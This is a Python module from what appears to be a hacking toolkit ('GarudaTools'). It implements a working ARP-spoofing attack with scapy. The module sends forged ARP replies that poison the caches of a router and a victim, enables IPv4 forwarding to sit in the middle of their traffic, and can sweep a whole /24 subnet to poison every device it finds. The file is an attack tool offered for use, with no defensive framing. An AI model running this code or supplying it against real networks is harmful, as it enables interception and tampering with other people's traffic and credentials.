#		Copyright (C) 2017 M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)
from core.GarudaTools import *
from core import colors
from scapy.all import *
from scapy.all import conf as sconf
import threading, queue
import time
import netifaces
from core.exceptions import *

conf = {
	"name": "arp_spoof",
	"version": "1.0",
	"shortdesc": "arp spoof",
	"github": "JhonIslanskha",
	"author": "M4st3rL1nux",
	"by": "Jh0n 1sl4nskh4_404",
	"initdate": "10.3.2016",
	"lastmod": "26.5.2017",
	"apisupport": True,
	"needroot": 1
}


# List of the variables
variables = OrderedDict((
	("target", ["192.168.1.3", "target ip address"]),
	("router", ["192.168.1.1", "router ip address"]),
	("all", ["false", "spoof every device [true/false]"]),
	("interface", ["eth0", "target interface"])
))

# Simple changelog
changelog = "Version 1.0:\nrelease\nVersion 2.0:\nrewritten"

option_notes = " interface only required when option: all = true"

customcommands = {
	"stop": "end arp spoof",
	"get": "<status> get arp spoof status",
}

class SpoofController(threading.Thread):
	targets = []
	attacking = []
	controller = None

	def __init__(self, controller):
		self.reset()
		self.controller = controller
		threading.Thread.__init__(self)

	def reset(self):
		self.targets = []
		self.attacking = []

	def run(self):
		try:
			ip = netifaces.ifaddresses(variables["interface"][0])[2][0]['addr']
		except(ValueError, KeyError):
			printError("invalid interface")
			self.controller.kill = True
			self.controller.error = "invalid interface"
			return
		ips = ip+"/24"

		sconf.verb = 0
		try:
			ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2,iface=variables["interface"][0],inter=0.1)
		except PermissionError:
			self.controller.kill = True
			self.controller.error = "permission error"
			return
		for snd,rcv in ans:
			ip = rcv.sprintf("%ARP.psrc%")
			if ip not in self.targets:
				self.targets.append(ip)
		for target in self.targets:
			if target not in self.attacking:
				arpspoof = ArpSpoofer(variables["router"][0], target, self.controller)
				arpspoof.start()
				self.attacking.append(target)

		time.sleep(30)

class Controller:
	kill = False
	error = None

	def __init__(self):
		self.kill = False
		self.error = None

	def reset(self):
		self.kill = False
		self.error = None

class ArpSpoofer(threading.Thread):
	router = None
	victim = None
	controller = None
	tried = 0

	def __init__(self, router, victim, controller):
		self.router = router
		self.victim = victim
		self.controller = controller
		self.tried = 0
		threading.Thread.__init__(self)

	def originalMAC(self, ip):
		ans, unans = arping(ip, verbose=0)
		for s,r in ans:
			return r[Ether].src

	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)

	def run(self):
		routerMAC = self.originalMAC(self.router)
		victimMAC = self.originalMAC(self.victim)
		if routerMAC == None:
			if self.tried < 6:
				self.tried =+ 1
				self.run()
			return
		if victimMAC == None:
			if self.tried < 6:
				self.tried =+ 1
				self.run()
			return

		while 1:
			if self.controller.kill == True:
				self.restore(self.router, self.victim, routerMAC, victimMAC)
				return
			self.poison(self.router, self.victim, routerMAC, victimMAC)
			time.sleep(1.5)

controller = Controller()
controller.kill = True

def run():
	printInfo("setting up...")
	controller.reset()
	printInfo("ipv4 forwarding...")
	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')

	if variables["all"][0] == "true":
		printInfo("starting arp spoof...")
		spoofcontroller = SpoofController(controller)
		spoofcontroller.start()

	else:
		printInfo("starting arp spoof...")
		arpspoof = ArpSpoofer(variables["router"][0], variables["target"][0], controller)
		arpspoof.start()

	printInfo("use \"stop\" command to end spoof")
	printInfo("get spoof status using \"get status\" command")

def stop(args):
	controller.kill = True
	os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
	printInfo("arp spoof ended")

def get(args):
	if args[0] == "status":
		if controller.error == None and controller.kill == False:
			printInfo("attack is running")
			return "attack is running"
		elif controller.error == None and controller.kill == True:
			printInfo("attack in ended")
			os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
			return "attack in ended"
		elif controller.error != None:
			printError("faced error: "+controller.error)
			os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
			return ModuleError(controller.error)

	else:
		raise UnknownCommand("unknown command")